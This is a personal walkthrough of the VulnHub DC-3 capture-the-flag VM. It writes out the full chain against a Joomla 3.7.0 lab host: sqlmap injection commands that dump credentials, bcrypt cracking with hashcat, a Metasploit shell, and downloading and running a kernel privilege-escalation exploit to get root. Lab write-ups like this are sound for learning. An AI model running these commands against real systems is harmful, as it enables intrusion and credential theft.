# DC: 3
[VulnHub link](https://www.vulnhub.com/entry/dc-3,312/)  
By DCAU

* As with DC: 1 and DC: 2, we are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/dc-3/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/dc-3/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.8`.
* The host is running only the HTTP (port 80) service, where the port for this server is open.
* Run `nmap -p- -A 10.0.2.8`:
![](/screenshots/dc-3/hostFullScan.jpg)
* Looking at the services which the vulnerable VM is running, we can see an Apache httpd web server running on port 80 (which is open). Also, it appears that the web server is running on a Joomla Content Management System (CMS) instead of WordPress.
* Opening `http://10.0.2.8` reveals a site with a welcome post (message) and a login form on the right-hand side:
![](/screenshots/dc-3/siteWebServer.jpg)
* I learnt from another walkthrough that we can identify the CMS behind the site through the header in the page's source, without using any tools at all:
![](/screenshots/dc-3/siteWebServerCMSVersion.jpg)
* Unlike the previous 2 iterations of DC which has 5 flags, this one only has **1 flag**.
* I tried my luck on the login form with common login credentials such as `admin:admin` and `admin:password` which do not work as expected.
* Moreover, the displayed error message does not reveal to us if the username exists or not, unlike WordPress which does.
![](/screenshots/dc-3/loginInvalidMessage.jpg)
* The username is in red in the screenshot, but I do not think that means that the username does not exist. The username `admin` is likely to exist because we see that the welcome post was `Written by admin`, and I tried logins with the username `admin` and also other random ones, but both showed the username in red as a result of the invalid login attempt.
* Next, I tried `http://10.0.2.8/robots.txt`, where the output told us that a `robots.txt` file does not exist.
* The page source does not seem to reveal much of interest to us as well.
* It seems like there was nothing more I could poke at from the site by clicking around, so I searched for `joomla scanner kali` on Google, and found that our Kali VM has `joomscan` which scans for Joomla CMS vulnerabilities.
* Run `joomscan -u 10.0.2.8`:
![](/screenshots/dc-3/joomscan.jpg)
* The first thing that caught my eye was the `admin page` at `http://10.0.2.8/administrator/`, which really actually is a login page for administrators. Again, I tried common login credentials which were not successful:
![](/screenshots/dc-3/siteAdminLogin.jpg)
* And once again, there is no information leakage on whether we have a working username or not.
* Next, I tried to access the 4 directory listings that were shown and we are actually able to see the various directories and files within them!
* This was my first encounter with the Joomla CMS and I was not quite sure what to look out for, even if I had access to directories and files, unlike for example WordPress - where I knew that I would hunt for files like wp-config.php.
* However, we do know from `joomscan` that the Joomla CMS on this site was version `3.7.0`. Moreover, I learnt from another walkthrough that we could also have found out the version of the Joomla CMS via the `README.txt` file:
![](/screenshots/dc-3/siteWebServerCMSVersion.jpg)
* I googled to see if there were exploits for this version of Joomla, and found the [Joomla Component Fields SQLi Remote Code Execution](https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce).
* I opened `msfconsole` and ran `use exploit/unix/webapp/joomla_comfields_sqli_rce`. After running `show options`, I `set RHOST 10.0.2.8`:
![](/screenshots/dc-3/msfconsoleJoomlaOptions.jpg)
* However, upon running `exploit`, we see that no session was created because there was "no logged-in Administrator or Super User user found":
![](/screenshots/dc-3/msfconsoleJoomlaExploitFailed.jpg)
* This tells us that there are no users logged in at the moment, or at least there are no users which have administrative privileges who are logged in.
* Next, we will explore 2 steps of using the same vulnerability to obtain our next piece of information.
* **Method 1: Using Existing Proof-of-Concept Exploit**
* I googled further and found a proof-of-concept exploit for the same vulnerability at this [GitHub link](https://github.com/XiphosResearch/exploits/tree/master/Joomblah).
* Clone the Git repository, and run `python joomblah.py http://10.0.2.8`:
![](/screenshots/dc-3/joomblahOutput.jpg)
* Within a few seconds, we get to know that the user `admin` exists, along with his password hash `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`.
* Note: Reading `joomblah.py` reveals to us a series of steps required by the exploit that the creator has abstracted for us, so all we had to do was to run a simple python command. Such steps include extracting the joomla table, and its users, etc, which we will explore manually executing for ourselves (to a certain extent) in method 2.
* **Method 2: Using sqlmap**
* Alternatively, instead of using the proof-of-concept exploit, `searchsploit 3.7` led us to exploit `42033`, where there is a vulnerable URL given, as well as a command using `sqlmap`.
* `sqlmap` is an automatic SQL injection tool, allowing us to gain access to information stored in databases using the right set of queries by the tool.
* Modifying the `sqlmap` to our context gives us: `sqlmap -u "http://10.0.2.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`.
* I got prompted 3 times after running the command. Firstly, the detected back-end DBMS is `MySQL` and the prompt asked us if we want to skip test payloads for other DBMSes, to which I said yes, because it only made sense to do so for what is relevant. If we arrived at a dead-end subsequently, this might be something worth re-looking.
* The second prompt asked us if we want to follow the redirect to `http://10.0.2.8:80/index.php/component/fields/`, which sqlmap received, to which I said yes. The SQL injection exploit here was fundamentally about the component fields portion.
* The last prompt asked us if we wanted to keep testing the other parameters, since sqlmap had already found the GET parameter 'list[fullordering]' to be vulnerable. I gave a yes, but the command execution came to an end soon enough after that, so I guess there were not many other parameters to be tested.
* Lastly, the command execution also told us that there were 5 entries in the database names, where `joomladb` appears to be of interest to us. We also now know that the MySQL version is >= `5.1`.
![](/screenshots/dc-3/sqlmapDatabaseNames.jpg)
* Running `sqlmap -u "http://10.0.2.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables --batch` gives us the list of tables in the `joomladb` database, where the `#__users` table is of concern to us because we wanted to find a valid set of user credentials:
![](/screenshots/dc-3/sqlmapTableNames.jpg)
* Next, we run `sqlmap -u "http://10.0.2.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump --batch` to find out the contents of table `#_users`:
![](/screenshots/dc-3/sqlmapTableEntry.jpg)
* The hash value in the table is the same as the one that we have found earlier.
* I ran `hash-identifer` against the password hash and interestingly found no results:
![](/screenshots/dc-3/hashIdentifierAdmin.jpg)
* I extracted the front portions of the hash, i.e. `$2y$` and ran a Google search against it. Wikipedia tells us that such a prefix in a hash string indicates that the hash is a "bcrypt hash in modular crypt format".
* We will be using `hashcat`, ... **Find out if background of hashcat is required.**
* I ran `hashcat --help` to find out what parameters we had to use, and the `Hash modes` list came up to be pretty long, so I ran `hashcat --help | grep bcrypt` to find out what number was the bcrypt hash mode, which turned out to be `3200`.
* Insert the password hash into a text file (mine is `crackThisHash.txt`).
* Run `hashcat -m 3200 crackThisHash.txt /usr/share/wordlists/rockyou.txt --force`:
![](/screenshots/dc-3/hashcat.jpg)
* After a few seconds, we see that the hash has been cracked, and we have now got a valid set of credentials: `admin:snoopy`.
* Note: I used the standard given `rockyou.txt` wordlist for this purpose.
* Note: Running the command without `--force` for me resulted in this error:
![](/screenshots/dc-3/hashcatError.jpg)
* We are now able to log in to `http://10.0.2.8/administrator/`:
![](/screenshots/dc-3/loginAdmin.jpg)
* After logging in, I poked around the articles, categories, modules, plugins, etc. but did not quite seem to find information that was useful to me. This was my first time inside a Joomla CMS administrator panel and I was probably just groping in the dark.
* I remembered the exploit session which we attempted earlier using `msfconsole` and decided to head back for a shot at it:
![](/screenshots/dc-3/msfconsoleJoomlaExploitSuccess.jpg)
* We were able to establish a meterpreter session this time because we are logged in as `admin`.
* Note: If you encounter the same error as before (no logged-in administrator user), refresh your administrator panel on your web browser to confirm that you are still logged in, just before you run `exploit`.
* Run `shell`, then `whoami` and we find that we are `www-data` as expected.
* Enter `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell and we find ourselves within `/var/www/html/templates/beez3`.
* I ran `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we could possibly exploit to gain root access:
![](/screenshots/dc-3/setuidBinaries.jpg)
* Nothing much really stood out to me. `pkexec` stood out to me, probably because I never saw it before. I googled about exploits relating to it, which was [available](https://www.exploit-db.com/exploits/17932) provided that the version running was <= 0.101. Running `pkexec --version` revealed that our version was `0.105`.
* I navigated to the `/home` directory and found several files for user `dc3`:
![](/screenshots/dc-3/dc3Files.jpg)
* The file `.sudo_as_admin_successful` stood out, but it was an empty file. Perhaps it is a hint? I opened up the `/cat/passwd` file to see if there was any user `admin`:
![](/screenshots/dc-3/passwdFile.jpg)
* Since there was no user `admin`, I was not quite sure what the file name meant. Perhaps admin referred to root.
* Nonetheless, we did confirm that there is a user `dc3`.
* At this point I was pretty much stuck on how I should be moving forward and referred to existing walkthroughs of DC-3, and found that one exploit to getting root was through a vulnerability in the web server's OS. This was getting interesting - I had never tried something like that before.
* To find out what OS version the web server is running, execute `cat /etc/issue; uname -a`:
![](/screenshots/dc-3/vulnerableOSVersion.jpg)
* We see that the web server is running on `Ubuntu 16.04 LTS`.
* Run `searchsploit Ubuntu 16.04` to find out if there are any existing exploits for this version of Ubuntu:
![](/screenshots/dc-3/searchsploitUbuntu.jpg)
* We will be using 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation from the list of available exploits.
* Run `cat /usr/share/exploitdb/exploits/linux/local/39772.txt` to see the details of the exploit.
* Download the .zip file for this exploit from [this GitHub link](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip) on the `/tmp` directory of the vulnerable web server.
* Run `unzip 39772.zip` to unzip the file, and we find `crasher.tar` and `exploit.tar`. At this point we are not exactly sure how we should be handling the files so I referred back to 39772.txt on how the files should be used:
![](/screenshots/dc-3/exploitUsage.jpg)
* Since we are looking at `exploit.tar`, run `tar -xvf exploit.tar` to extract its contents, which gives us the directory `ebpf_mapfd_doubleput_exploit`:
![](/screenshots/dc-3/doubleputExploitDirectory.jpg)
* Following the instructions in 39772.txt, run `./compile.sh`, which is a script that compiles the 3 C programs.
* Next, run `./doubleput`, and we have our root access:
![](/screenshots/dc-3/rootAccess.jpg)
* Head to `/root` directory, and we find `the-flag.txt`:
![](/screenshots/dc-3/flag.jpg)
* Hurray, we are done with this challenge!

# Other walkthroughs visited #
1. https://www.hackingarticles.in/dc-3-walkthrough/
2. https://s1gh.sh/vulnhub-dc-3/